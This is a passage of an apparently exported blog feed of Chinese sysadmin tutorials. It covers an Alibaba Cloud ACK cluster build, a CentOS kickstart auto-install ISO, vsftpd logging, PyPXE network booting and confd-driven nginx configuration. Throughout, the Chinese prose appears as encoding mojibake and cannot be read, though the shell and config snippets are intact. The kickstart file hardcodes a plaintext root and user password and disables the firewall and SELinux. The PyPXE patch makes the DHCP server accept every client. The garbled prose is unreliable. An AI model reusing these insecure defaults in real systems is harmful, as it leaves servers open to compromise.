cï¼šä¸€èˆ¬è¡¨ç¤ºè®¡ç®—å‹ï¼ˆcomputationalï¼‰ gï¼šä¸€èˆ¬è¡¨ç¤ºé€šç”¨å‹ï¼ˆgeneralï¼‰ rï¼šä¸€èˆ¬è¡¨ç¤ºå†…å­˜å‹ï¼ˆramï¼‰ neï¼šä¸€èˆ¬è¡¨ç¤ºç½‘ç»œå¢å¼ºå‹ï¼ˆnetwork enhancedï¼‰ æ•°å­—ä¸€èˆ¬åŒºåˆ«åŒç±»å‹è§„æ ¼æ—é—´çš„å‘å¸ƒæ—¶é—´ã€‚æ›´å¤§çš„æ•°å­—ä»£è¡¨æ–°ä¸€ä»£è§„æ ¼æ—ï¼Œæ‹¥æœ‰æ›´é«˜çš„æ€§ä»·æ¯”ï¼Œä»·æ ¼ä½æ€§èƒ½å¥½ã€‚ largeï¼šnè¶Šå¤§ï¼ŒvCPUæ ¸æ•°è¶Šå¤šã€‚ ä¾‹å¦‚ï¼Œecs.g6.2xlargeè¡¨ç¤ºé€šç”¨å‹g6è§„æ ¼æ—ä¸­çš„ä¸€ä¸ªå®ä¾‹è§„æ ¼ï¼Œæ‹¥æœ‰8ä¸ªvCPUæ ¸ã€‚ç›¸æ¯”äºg5è§„æ ¼æ—ï¼Œg6ä¸ºæ–°ä¸€ä»£é€šç”¨å‹å®ä¾‹è§„æ ¼æ—ã€‚\næŒ‰ä¸Šé¢é€‰ecs.c6.largeï¼Œè´¹ç”¨0.95/æ—¶ï¼Œä¼¼ä¹æ¯”ecs.n1.medium 1.34/æ—¶å¥½ã€‚\nèŠ‚ç‚¹æ•°é‡ï¼šæœ€å°‘æ˜¯2ä¸ªï¼Œæ— æ³•å‡åˆ°0ï¼Œæ²¡åŠæ³•ã€‚\nç³»ç»Ÿç›˜ï¼šé€‰ESSDï¼Œé€Ÿåº¦å¿«ï¼Œ40Gå³å¯ã€‚ä¸è¦å¼€äº‘ç›˜å¤‡ä»½ï¼Œä¼šè¦æ±‚è®¾ç½®snapshotç­–ç•¥ï¼Œè¦æ”¶é’±ã€‚\næ“ä½œç³»ç»Ÿï¼šé€‰CentOS 7.9ï¼Œä¸è¦é€‰aliyunçš„è‡ªå®šä¹‰ç‰ˆæœ¬ã€‚æ›´åŠ æ ‡å‡†åŒ–ï¼Œä¾¿äºå‡çº§ã€‚\nè¿™é‡Œé€‰æ‹©æ“ä½œç³»ç»Ÿçš„æ—¶å€™ï¼Œåªæœ‰ä¸¤ä¸ªç³»ç»Ÿå¯ä»¥é€‰æ‹©ï¼Œä¸€ä¸ªæ˜¯centos7ï¼Œä¸€ä¸ªæ˜¯é˜¿é‡Œäº‘linuxã€‚ä¸ºä»€ä¹ˆæ“ä½œç³»ç»Ÿä¸èƒ½é€‰å¾ˆå¤šç§ï¼Ÿå› ä¸ºé˜¿é‡Œäº‘è¦ä½¿ç”¨Cloud-initè‡ªåŠ¨å®‰è£…dockerçš„å„ç§å·¥å…·åŒ…è¿›ä½œä¸ºworkerè§’è‰²çš„ecsï¼Œæ‰€ä»¥ä»–å¯¹ç³»ç»Ÿçš„è¦æ±‚æ›´é«˜ï¼Œå¦åˆ™å¾ˆå¯èƒ½å‡ºç°å„ç§å„æ ·çš„é—®é¢˜ã€‚è¿™é‡Œæ‰ä¼šæœ‰è¿™ç§é™åˆ¶ã€‚\nå¯†é’¥å¯¹é€‰åˆ™æ–°å»ºä¸€ä¸ªk8s-sshã€‚\nä¸‹ä¸€æ­¥ç»„ä»¶é…ç½®\nå®‰è£…ingressç»„ä»¶ï¼šéœ€è¦å¯¹å¤–æœåŠ¡ï¼Œè¿™ä¸ªå¿…é€‰ï¼Œä¼šç»™åˆ†é…ä¸€ä¸ªslbè´Ÿè½½å‡è¡¡\nå¦‚æœæƒ³K8Sé›†ç¾¤çš„æœåŠ¡ç›´æ¥æä¾›æœåŠ¡ç»™ç”¨æˆ·è®¿é—®ï¼Œå¯ä»¥é€‰æ‹©ã€å…¬ç½‘ã€ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªSLBå¹¶ç”¨EIPæš´éœ²å…¬ç½‘ï¼Œåç«¯æ˜¯k8s-ingresså…¥å£ã€‚\nè´Ÿè½½ç±»å‹ï¼š å…¬ç½‘ï¼Œå¯¹å¤–æœåŠ¡å°±è¦å†™å…¬ç½‘ã€‚\nå­˜å‚¨æ’ä»¶ï¼š å¿…é€‰CSIï¼Œå¯¹ä¹‹ååˆ›å»ºæ•°æ®å·è¯­æ³•æ²¡å½±å“\nç›‘æ§æ’ä»¶ï¼š åŸºç¡€ç‰ˆæ˜¯å…è´¹çš„ï¼Œå¯ä»¥æ”¾å¿ƒä½¿ç”¨\næ—¥å¿—æœåŠ¡ï¼š æ—¥å¿—æœåŠ¡å¯ä»¥åŠ ï¼Œå°¤å…¶æ˜¯ä»¥åå¦‚æœæƒ³é‡‡é›†å†…éƒ¨dokeré‡Œé¢çš„æ—¥å¿—ï¼Œè¿™é‡Œè¿˜æ˜¯æ¨èåŠ ä¸€ä¸‹æœ€å¥½ï¼Œä»–ä¼šè‡ªåŠ¨åˆ›å»ºæ ‡è®°é‡‡é›†ï¼Œåé¢ä½¿ç”¨è¿™ä¸ªæ ‡è®°å¯ä»¥æ–¹ä¾¿çš„è‡ªåŠ¨æ·»åŠ æ—¥å¿—èŠ‚ç‚¹ã€‚\nslbè´¹ç”¨ï¼š 0.66/å°æ—¶,å¸¦å®½è´¹ç”¨0.8/g\nä¸‹ä¸€æ­¥ç¡®è®¤é…ç½®\næ ¸å¯¹ä¸€ä¸‹æ˜¯å¦å’Œè‡ªå·±é€‰æ‹©çš„ä¸€æ ·\næ ¸å¯¹æ— è¯¯åç‚¹å‡»åˆ›å»ºé›†ç¾¤ã€‚æ³¨æ„ï¼šåˆ›å»ºé›†ç¾¤çš„æ—¶å€™ï¼Œä¼šæ£€æµ‹ä¸€äº›æƒé™ï¼Œå¦‚æœæƒé™æœªå¼€é€šï¼Œå¯ä»¥ä»¤å¼€é¡µé¢è¿›è¡Œå¼€é€šæˆæƒï¼Œæ¯”å¦‚esså¼¹æ€§ä¼¸ç¼©ï¼Œå¼€é€šåç‚¹å°æŒ‰é’®åˆ·æ–°çŠ¶æ€ï¼Œ çŠ¶æ€éƒ½okä»¥åï¼Œç‚¹å‡»åˆ›å»ºé›†ç¾¤ã€‚\nç­‰å¾…ååˆ†é’Ÿå·¦å³é›†ç¾¤åˆ›å»ºæˆåŠŸã€‚åˆ°æ­¤åˆ›å»ºé›†ç¾¤å·²ç»å®Œæˆã€‚\nç„¶ååˆ°æ§åˆ¶å°å¯ä»¥æŸ¥çœ‹ï¼Œè¿™æ ·ACKé›†ç¾¤å°±åˆ›å»ºå¥½äº†ã€‚\nåè®°ï¼š\næ¯æ‰ACKçš„æ—¶å€™ï¼Œåˆ‡å¿Œå»åˆ é™¤arms-promçš„helmï¼Œå†åˆ é™¤acké›†ç¾¤ï¼Œå¦åˆ™ä¼šæ¸…ä¸å¹²å‡€ä¸œè¥¿ã€‚\nä¸‹æ¬¡é‡å»ºçš„æ—¶å€™ä¼šè£…ä¸ä¸Šprometheus\n","date":"2021-10-26","img":"","permalink":"https://rendoumi.com/posts/20211026-ack_build/","series":null,"tags":null,"title":"é˜¿é‡Œäº‘ACKå®Œå…¨ç”Ÿäº§ç¯å¢ƒè§„åˆ’å’Œæ­å»º"},{"categories":null,"content":"ä¹‹å‰ä»‹ç»è¿‡å¦‚ä½•åˆ¶ä½œä¸€ä¸ª centos live cdrom ç³»ç»Ÿ\né‚£ä¹ˆï¼ŒæŸäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯èƒ½æ— æ³•å¼„ä¸€ä¸ª pxe ç³»ç»Ÿï¼Œè€Œåªèƒ½é€šè¿‡ idrac æŒ‚è½½ iso çš„æ–¹å¼å®‰è£…ç³»ç»Ÿ\nè¯¥å¦‚ä½•å»åšå‘¢ï¼Ÿ\næ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€ä¸‹è½½Centosçš„minimalå®‰è£…å…‰ç›˜ 1wget http://mirrors.163.com/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-Minimal-2009.iso 2yum install -y mkisofs äºŒã€å‡†å¤‡kickstartå®‰è£…æ–‡ä»¶ ä¸‹è½½ï¼š centos7.ks 1text 2skipx 3install 4 5auth --useshadow --enablemd5 6authconfig --enableshadow --passalgo=sha512 7 8firstboot --disable 9keyboard us 10lang en_US.UTF-8 11reboot 12cdrom 13 14firewall --disable 15selinux --disabled 16 17services --enabled=\u0026#34;chronyd\u0026#34; 18logging level=info 19 20 21#ignoredisk --only-use=vda 22ignoredisk --only-use=sda 23#bootloader --location=mbr --append=\u0026#34;net.ifnames=0 biosdevname=0 crashkernel=auto\u0026#34; 24bootloader --location=mbr --append=\u0026#34;crashkernel=auto\u0026#34; 25 26rootpw --plaintext Renren2021! 27timezone Asia/Shanghai --isUtc 28 29network --device=lo --hostname=localhost.localdomain 30user --name=supdev --gid=511 --groups=\u0026#34;supdev\u0026#34; --uid=511 --password=\u0026#34;Renren2021!\u0026#34; 31 32zerombr 33clearpart --all --initlabel 34 35part biosboot --fstype=biosboot --size=1 36part /boot --fstype ext4 --size=2048 37part swap --asprimary --size=8192 38part / --fstype ext4 --size=1 --grow 39 40#part biosboot --fstype=biosboot --size=1 41#part /boot --fstype ext2 --size 250 42#part pv.01 --size 1 --grow 43#volgroup vg pv.01 44#logvol / --vgname=vg --size=1 --grow --fstype ext4 --fsoptions=discard,noatime --name=root 45#logvol /tmp --vgname=vg --size=1024 --fstype ext4 --fsoptions=discard,noatime --name=tmp 46#logvol swap --vgname=vg --recommended --name=swap 47 48#uefi 49#partition /boot/efi --asprimary --fstype=vfat --label EFI --size=200 50#partition /boot --asprimary --fstype=ext4 --label BOOT --size=500 51#partition / --asprimary --fstype=ext4 --label ROOT --size=4096 --grow 52 53 54services --enabled=network 55 56reboot 57 58%pre 59parted -s /dev/sda mklabel gpt 60%end 61 62%packages 63@core 64@system-admin-tools 65@additional-devel 66@virtualization-client 67@virtualization-platform 68@virtualization-tools 69libguestfs-tools-c 70perl-Sys-Virt 71qemu-guest-agent 72qemu-kvm-tools 73curl 74dstat 75expect 76openssl 77initscripts 78ipmitool 79lrzsz 80lsof 81mtools 82nc 83nmap 84perl 85perl-CPAN 86procps 87python 88screen 89sysstat 90systemtap 91systemtap-client 92systemtap-devel 93tcpdump 94telnet 95vim 96wget 97wsmancli 98zip 99chrony 100kexec-tools 101net-tools 102ntp 103ntpdate 104man 105acpid 106chrony 107telnet 108%end ä¸‰ã€å‡†å¤‡ç”Ÿæˆisoçš„è„šæœ¬ ä¸‹è½½ï¼š makeiso.sh 1#!/bin/bash 2rm -rf /tmp/bootiso /tmp/bootcustom /tmp/boot.iso 3mkdir /tmp/bootiso 4mount -o loop CentOS-7-x86_64-Minimal-2009.iso /tmp/bootiso 5 6mkdir /tmp/bootcustom 7cp -r /tmp/bootiso/* /tmp/bootcustom 8umount /tmp/bootiso 9rmdir /tmp/bootiso 10 11 12chmod -R u+w /tmp/bootcustom 13 14cp centos7.ks /tmp/bootcustom/isolinux/ks.cfg 15 16sed -i \u0026#39;/menu\\ default/d\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg 17sed -i \u0026#39;s/^timeout\\ .*/timeout 10/g\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg 18sed -i \u0026#39;/^label\\ linux/i label\\ kickstart\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg 19sed -i \u0026#39;/^label\\ linux/i \\ \\ menu\\ label\\ ^Install\\ Using\\ Kickstart\\ CentOS 7\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg 20sed -i \u0026#39;/^label\\ linux/i \\ \\ menu\\ default\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg 21sed -i \u0026#39;/^label\\ linux/i \\ \\ kernel\\ vmlinuz\\ biosdevname=0\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg 22sed -i \u0026#39;/^label\\ linux/i \\ \\ append\\ initrd=initrd.img\\ ks=cdrom:\\/ks.cfg\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg 23sed -i \u0026#39;/^label\\ linux/i \\\\n\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg 24 25cd /tmp/bootcustom 26mkisofs -o /tmp/boot.iso -b isolinux.bin -c boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -V \u0026#34;CentOS 7 x86_64\u0026#34; -R -J -v -T isolinux/. . ç”Ÿæˆçš„è‡ªåŠ¨å®‰è£…å…‰ç›˜æ–‡ä»¶åœ¨ /tmp/boot.iso ï¼Œåœ¨ idrac ä¸­ mount å‡ºæ¥ï¼Œå°±å¯ä»¥ç”¨ virtual CD-ROM è‡ªåŠ¨å®‰è£…äº†\n","date":"2021-10-25","img":"","permalink":"https://rendoumi.com/posts/20211025-autoinstall_cd/","series":null,"tags":null,"title":"Centos Auto Install Cdromè‡ªåŠ¨å®‰è£…cdromçš„åˆ¶ä½œ"},{"categories":null,"content":"ä¸ºäº†ç ”å‘æ–¹ä¾¿å°±ç»™ä»–ä»¬åœ¨å†…ç½‘å¼€é€šäº† vsftpd çš„æœåŠ¡ã€‚\nç»“æœ java ç›´æ¥æœ‰å°å¥½çš„ ftp library å¯ç”¨ï¼Œå¤§å®¶å°±ç›´æ¥ç”¨äº†ã€‚\nå¯¼è‡´ä»»ä½•å•ç‹¬çš„ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ éƒ½ä¼šèµ·ä¸€ä¸ª ftp å®ä¾‹ï¼Œæ²¡æœ‰å¤ç”¨ ftp çš„ socket é“¾æ¥ ã€‚ç³»ç»ŸæŒ¤å‹äº†å¤§é‡çš„socketè¿æ¥ã€‚\nçƒ¦æ¼å•Šï¼Œå‡ºäº†äº‹å°±éº»çƒ¦ã€‚éœ€è¦æŠŠæ—¥å¿—éƒ½è¯¦ç»†è®°ä¸‹æ¥\nåšæ³•å¦‚ä¸‹ï¼š\n1vi /etc/vsftp/vsftpd.conf 2...... 3dual_log_enable=YES 4log_ftp_protocol=YES 5xferlog_enable=YES 6xferlog_std_format=NO 7...... è§£é‡Šä¸€ä¸‹ï¼š\ndual_log_enable \u0026mdash; å’Œ xferlog_enable ååŒï¼Œä¼šå†™ä¸¤ä»½æ—¥å¿—ï¼Œä¸€ä»½åˆ°/var/log/xferlogï¼Œä¸€ä»½åˆ°/var/log/vsftpd.log\nlog_ftp_protocol \u0026mdash; å’Œ xferlog_enable ååŒï¼ŒåŒæ—¶xferlog_std_formatéœ€è¦è®¾ç½®ä¸ºNOï¼Œè¿™æ ·æ‰€æœ‰çš„ FTP å‘½ä»¤éƒ½ä¼šè®°å½•ä¸‹æ¥ã€‚\nè¿™æ ·æ‰€æœ‰äººçš„æ“ä½œéƒ½ä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œå°±åé¡¾æ— å¿§äº†ã€‚\n","date":"2021-10-25","img":"","permalink":"https://rendoumi.com/posts/20211025-vsftpd/","series":null,"tags":null,"title":"Vsftpdçš„æ—¥å¿—è®¾ç½®"},{"categories":null,"content":"ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬è¦æ­å»ºä¸€ä¸ªæ­£å¼çš„pxeè‡ªåŠ¨è£…æœºç³»ç»Ÿï¼Œéœ€è¦è£… dnsmasq åš dhcp + tftp ï¼Œéœ€è¦ç¼–è¯‘ ipxe æ¥è·å¾— undionly.kpxe ï¼Œéœ€è¦ http æœåŠ¡å™¨æ¥æä¾›èµ„æºä¸‹è½½ï¼Œrepo åŒæ­¥æœåŠ¡æ¥æä¾› repoã€‚ç»„ä»¶éå¸¸å¤šï¼Œä¹Ÿæ¯”è¾ƒéº»çƒ¦ã€‚\nå½“ç„¶ï¼Œè¿™ä¹ˆå¤šä¹Ÿæ˜¯æœ‰å¿…è¦çš„ï¼Œå› ä¸ºå¯ä»¥æŒç»­æä¾›ä¸€ä¸ªç¨³å®šçš„è£…æœºç³»ç»Ÿã€‚\nåœºæ™¯ä¸€æ¢ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æœ¬åœ°æœºæˆ¿é‡Œï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæƒ³æ­ä¸€å¥—ç¯å¢ƒçš„æ­¥éª¤å°±æ¯”è¾ƒç¹å¤äº†ã€‚\nPyPXE å°±æ˜¯éå¸¸ç®€å•çš„ä¸€ä¸ªç¨‹åºï¼Œå±…ç„¶è‡ªå·±å®ç°äº†ç”¨äº PXE çš„ dhcpã€tftp å’Œ http å…¨éƒ¨çš„åŠŸèƒ½ï¼Œè€Œä¸”æ”¯æŒ iPXEã€‚\nå¤ªç‰›é€¼äº†ï¼Œå‰æå•Šï¼ŒPyPXE æ˜¯åŸºäº Python 2.7 çš„ï¼ŒPython 3.xæ˜¯è¿è¡Œä¸äº†çš„ã€‚\næƒ³è®©å®ƒè·‘èµ·æ¥è¿˜å¿…é¡»åšä¸€å®šçš„ä¿®æ”¹ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€ä¸‹è½½PyPXE 1git clone https://github.com/pypxe/PyPXE.git 2cd PyPXE ä¸‹è½½å°±è¡Œäº†ï¼Œä¸ç”¨å®‰è£…ã€‚\näºŒã€æ‰‹åŠ¨ç”Ÿæˆconfig.jsoné…ç½®æ–‡ä»¶ 1{ 2 \u0026#34;DHCP_SERVER_IP\u0026#34;: \u0026#34;192.168.85.27\u0026#34;, 3 \u0026#34;DHCP_FILESERVER\u0026#34;: \u0026#34;192.168.85.27\u0026#34;, 4 5 \u0026#34;DHCP_OFFER_BEGIN\u0026#34;: \u0026#34;192.168.85.200\u0026#34;, 6 \u0026#34;DHCP_OFFER_END\u0026#34;: \u0026#34;192.168.85.250\u0026#34;, 7 \u0026#34;DHCP_SUBNET\u0026#34;: \u0026#34;255.255.255.0\u0026#34;, 8 \u0026#34;DHCP_ROUTER\u0026#34;: \u0026#34;192.168.85.1\u0026#34;, 9 \u0026#34;DHCP_DNS\u0026#34;: \u0026#34;114.114.114.114\u0026#34;, 10 11 \u0026#34;DHCP_SERVER_PORT\u0026#34;: 67, 12 \u0026#34;DHCP_BROADCAST\u0026#34;: \u0026#34;\u0026#34;, 13 \u0026#34;DHCP_MODE_PROXY\u0026#34;: false, 14 \u0026#34;DHCP_WHITELIST\u0026#34;: false, 15 \u0026#34;HTTP_PORT\u0026#34;: 80, 16 \u0026#34;LEASES_FILE\u0026#34;: \u0026#34;\u0026#34;, 17 \u0026#34;MODE_DEBUG\u0026#34;: \u0026#34;dhcp\u0026#34;, 18 \u0026#34;MODE_VERBOSE\u0026#34;: \u0026#34;\u0026#34;, 19 \u0026#34;NBD_BLOCK_DEVICE\u0026#34;: \u0026#34;\u0026#34;, 20 \u0026#34;NBD_COPY_TO_RAM\u0026#34;: false, 21 \u0026#34;NBD_COW\u0026#34;: true, 22 \u0026#34;NBD_COW_IN_MEM\u0026#34;: false, 23 \u0026#34;NBD_PORT\u0026#34;: 10809, 24 \u0026#34;NBD_SERVER_IP\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, 25 \u0026#34;NBD_WRITE\u0026#34;: false, 26 \u0026#34;NETBOOT_DIR\u0026#34;: \u0026#34;netboot\u0026#34;, 27 \u0026#34;NETBOOT_FILE\u0026#34;: \u0026#34;boot.http.ipxe\u0026#34;, 28 \u0026#34;STATIC_CONFIG\u0026#34;: \u0026#34;\u0026#34;, 29 \u0026#34;SYSLOG_PORT\u0026#34;: 514, 30 \u0026#34;SYSLOG_SERVER\u0026#34;: null, 31 \u0026#34;USE_DHCP\u0026#34;: true, 32 \u0026#34;USE_HTTP\u0026#34;: true, 33 \u0026#34;USE_IPXE\u0026#34;: true, 34 \u0026#34;USE_TFTP\u0026#34;: true 35} ä¸Šé¢jsonæ–‡ä»¶æ— æ³•åŠ æ³¨è§£ï¼Œæˆ‘ä»¬æŠŠå®ƒåˆ†ä¸‰éƒ¨åˆ†\næœ¬æœºé…ç½®ï¼Œæœ¬æœºçš„åœ°å€éƒ½æ˜¯ 192.168.85.27\ndhcp çš„é…ç½®ï¼Œå¼€å§‹192.168.85.200ï¼Œç»“æŸ192.68.85.250ï¼Œæ©ç 255.255.255.0ï¼Œç½‘å…³192.168.85.1ï¼ŒDNS114.114.114.114\nç¬¬ä¸‰éƒ¨åˆ†ä¸ç”¨åŠ¨\nä¸‰ã€ä¸‹è½½ISOå¹¶ä¿®æ”¹ipxeè„šæœ¬ 1cd netboot 2wget http://mirrors.163.com/rocky/8/isos/x86_64/Rocky-8.4-x86_64-dvd1.iso 3mkdir rocky8.iso 4mount -o loop Rocky-8.4-x86_64-dvd1.iso rocky8.iso 5 6cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; boot.http.ipxe 7#!ipxe 8 9:start 10menu PXE Boot Options 11item shell iPXE shell 12item Rocky8 Install rocky8 13item exit Exit to BIOS 14 15choose --default rocky8 --timeout 5000 option \u0026amp;\u0026amp; goto ${option} 16:shell 17shell 18 19 20:rocky8 21set root http://192.168.85.27/rocky8.iso 22initrd ${root}/images/pxeboot/initrd.img 23kernel ${root}/images/pxeboot/vmlinuz inst.repo=${root}/ initrd=initrd.img ip=dhcp 24boot 25 26 27:exit 28exit 29EOF ä¸‰ã€ä¿®æ”¹æºä»£ç  è¿è¡Œä¸€ä¸‹ï¼š\n1python -m pypxe.server --config config.json --debug all --verbose all å¦‚æœæˆ‘ä»¬èµ·ä¸€å°æœºå™¨æˆ–è€…è™šæœºï¼Œä¼šæŠ¥ç¬¬ä¸€ä¸ªé”™ï¼š\nUnicodeDecodeError: \u0026lsquo;ascii\u0026rsquo; codec can\u0026rsquo;t decode byte 0xc0 in position 0: ordinal not in range(128)\nè¿™ä¸ªæ˜¯ä»£ç æŠ¥é”™ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸€ä¸‹\n1vi pypxe/dhcp.py 2 3 def tlv_encode(self, tag, value): 4 \u0026#39;\u0026#39;\u0026#39;Encode a TLV option.\u0026#39;\u0026#39;\u0026#39; 5 6 # æ³¨é‡Šæ‰ä¸‹é¢çš„ä¸¤è¡Œï¼Œæˆ‘ä»¬ä¸éœ€è¦æ‰“å°å‡ºæˆ‘ä»¬ä¸€å®šèƒ½çœ‹æ‡‚çš„å­—ç¬¦ï¼Œéƒ½æŒ‰byteså¤„ç†å³å¯ 7 #if type(value) is str: 8 # value = value.encode(\u0026#39;ascii\u0026#39;) 9 value = bytes(value) 10 return struct.pack(\u0026#39;BB\u0026#39;, tag, len(value)) + value ç„¶åæˆ‘ä»¬éœ€è¦ä¿®æ”¹ç¬¬äºŒä¸ªåœ°æ–¹ï¼Œç†ç”±æ˜¯è¿™ä¸ª PyPXE ä¼šåˆ¤æ–­ Client å‘è¿‡æ¥çš„ dhcp è¯·æ±‚ï¼Œå®ƒåªå®ç°äº†é’ˆå¯¹PXE-Clientçš„ Vendor-classï¼š\næ‰€ä»¥æˆ‘ä»¬ä¹Ÿè¦å±è”½ä¸€ä¸‹ï¼Œå¦åˆ™æŒ‰ç…§æ­£å¸¸è¿‡ç¨‹\nå®¢æˆ·ç«¯dhcp \u0026ndash;\u0026gt; PyPXE åï¼ŒPyPXE é€å›å®¢æˆ· ipxe è„šæœ¬ï¼Œç„¶åå®¢æˆ·å®‰è£…ï¼Œå½“åŠ è½½äº†vmlinuzå’Œinitrdä¹‹åä¼šè¿›å…¥anaconda-linuxè¿›è¡Œç³»ç»Ÿå®‰è£…ï¼Œè¿‡ç¨‹ä¸­ä¼šå†æ¬¡å‘DHCPæœåŠ¡å™¨ç”³è¯·IPåœ°å€ï¼Œ è¿™ä¸ªæ—¶å€™ä»–å‘DHCP Serverå‘å‡ºçš„discoverç”³è¯·æ˜¯å¾—ä¸åˆ°å›å¤çš„ï¼Œå› æ­¤å®‰è£…è¿‡ç¨‹å°†è¢«æ‰“æ–­ã€‚\n1vi pypxe/dhcp.py 2 3 def validate_req(self, client_mac): 4 # client request is valid only if contains Vendor-Class = PXEClient 5 \u0026#39;\u0026#39;\u0026#39;ä»£ç æ•´ä¸ªæ³¨é‡Šæ‰ï¼Œç›´æ¥è¿”å› True 6 if self.whitelist and self.get_mac(client_mac) not in self.get_namespaced_static(\u0026#39;dhcp.binding\u0026#39;): 7 self.logger.info(\u0026#39;Non-whitelisted client request received from {0}\u0026#39;.format(self.get_mac(client_mac))) 8 return False 9 if 60 in self.options[client_mac] and \u0026#39;PXEClient\u0026#39;.encode() in self.options[client_mac][60][0]: 10 self.logger.info(\u0026#39;PXE client request received from {0}\u0026#39;.format(self.get_mac(client_mac))) 11 return True 12 self.logger.info(\u0026#39;Non-PXE client request received from {0}\u0026#39;.format(self.get_mac(client_mac))) 13 return False 14 \u0026#39;\u0026#39;\u0026#39; 15 return True è¿™æ ·ä¿®æ”¹åï¼Œå°±å¯ä»¥æ­£å¸¸å®‰è£…äº†ã€‚\næœåŠ¡å™¨å¯åŠ¨ï¼š\nå®¢æˆ·ç«¯å¯åŠ¨pxeå¼€å§‹å®‰è£…ï¼Œçœ‹ä¸‹é¢ï¼Œç³»ç»Ÿçš„ipxe dhcpä¸€æ¬¡ï¼Œç„¶åchainload.kpxe åˆä¸€æ¬¡ï¼Œanaconda åˆä¸€æ¬¡ï¼Œæœ€å°‘ä¼šå‘ä¸‰æ¬¡æˆ–æ›´å¤šçš„dhcpè¯·æ±‚ã€‚\nç”¨ VNC è¿è¿›å»å¯ä»¥çœ‹åˆ°å®‰è£…ç”»é¢ï¼Œå¦‚æœæ˜¯ kickstart å°±æ˜¯å…¨è‡ªåŠ¨å®‰è£…äº†ã€‚\n","date":"2021-10-22","img":"","permalink":"https://rendoumi.com/posts/20211022-pypxe/","series":null,"tags":null,"title":"PyPXE-ä¸€ä¸ªç‰›é€¼çš„ä¸€ç«™å¼PXEå®‰è£…åŒ…"},{"categories":null,"content":"ä¸Šä¸€ç¯‡æ–‡ç« æˆ‘ä»¬ä»‹ç»äº† ETCD çš„å®¹å™¨åŒ–ï¼Œæè¿™ä»¶äº‹æƒ…çš„ä¸»è¦ç›®çš„å…¶å®æ˜¯è¦åŠ¨æ€æ›´æ–° Nginx çš„é…ç½®\nè¿™ä¸€ç« æˆ‘ä»¬å°±æ¥é…ç½® confd å’Œ Nginxï¼Œæ¥è¾¾åˆ°åŠ¨æ€æ›´æ–° Nginx é…ç½®çš„ç›®çš„\nä¸€ã€å®‰è£…é…ç½®confd ä¸‹è½½å¹¶å®‰è£…ï¼š\n1wget https://github.com/kelseyhightower/confd/releases/download/v0.16.0/confd-0.16.0-linux-amd64 2mv confd-0.16.0-linux-amd64 /usr/sbin/confd 3chmod +x /usr/sbin/confd ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼š\næˆ‘ä»¬åœ¨ etcd ä¸­å­˜æ”¾çš„æ ¼å¼å¦‚ä¸‹\n1etcdctl set /nginx/app01/subdomain app1 2etcdctl set /nginx/app01/upstream/app01_1 \u0026#34;192.168.0.1:5601\u0026#34; 3 4/nginx/app01/subdomain \u0026#34;app01\u0026#34; 5/nginx/app01/upstream/app01_1 \u0026#34;192.168.0.1:5601\u0026#34; 6/nginx/app01/upstream/app01_2 \u0026#34;192.168.0.2:5601\u0026#34; é‚£ä¹ˆï¼Œæˆ‘ä»¬å…ˆç”Ÿæˆ confd çš„é…ç½®æ–‡ä»¶ï¼š\n1mkdir -p /etc/confd/{conf.d,templates} 2 3cat \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/confd/conf.d/nginx.toml 4[template] 5src = \u0026#34;nginx.conf.tmpl\u0026#34; 6dest = \u0026#34;/etc/nginx/conf.d/nginx-auto.conf\u0026#34; 7keys = [ 8 \u0026#34;/nginx/app01/subdomain\u0026#34;, 9 \u0026#34;/nginx/app01/upstream\u0026#34;, 10] 11check_cmd = \u0026#34;/usr/sbin/nginx -t\u0026#34; 12reload_cmd = \u0026#34;/usr/sbin/nginx -s reload\u0026#34; 13EOF 14 15cat \u0026lt;\u0026lt;EOT\u0026gt;\u0026gt;/etc/confd/templates/nginx.conf.tmpl 16upstream {{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}} { 17{{range getvs \u0026#34;/nginx/app01/upstream/*\u0026#34;}} 18 server {{.}}; 19{{end}} 20} 21 22server { 23 server_name {{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}}.example.com; 24 location / { 25 proxy_pass http://{{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}}; 26 proxy_redirect off; 27 proxy_set_header Host $host; 28 proxy_set_header X-Real-IP $remote_addr; 29 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 30 } 31} 32EOT confd ä¼šæ ¹æ® etcd çš„å€¼ï¼Œç»“åˆ nginx.conf.tmpl ï¼Œç”Ÿæˆ nginx-auto.confï¼Œç„¶å nginx -t éªŒè¯é€šè¿‡åï¼Œæ‰§è¡Œ nginx -s roladã€‚\næ³¨æ„ï¼šnginxçš„é…ç½®ä¸­å¿…é¡»æœ‰ include /etc/nginx/conf.d/*.conf;\näºŒã€è¿è¡Œconfd 1# åªå¤„ç†ä¸€æ¬¡ 2confd -onetime -backend etcd -node http://etcd-svc.default:2379 3 4# æŒ‰æ—¶é—´è½®è¯¢ 5confd -interval=60 -backend etcd -node http://etcd-svc.default:2379 \u0026amp; è¿™æ ·å°±å¯ä»¥åŠ¨æ€æ›´æ–° Nginx äº†ã€‚\n","date":"2021-10-21","img":"","permalink":"https://rendoumi.com/posts/20211021-etcd_confd_nginx/","series":null,"tags":null,"title":"ETCD + CONFD + 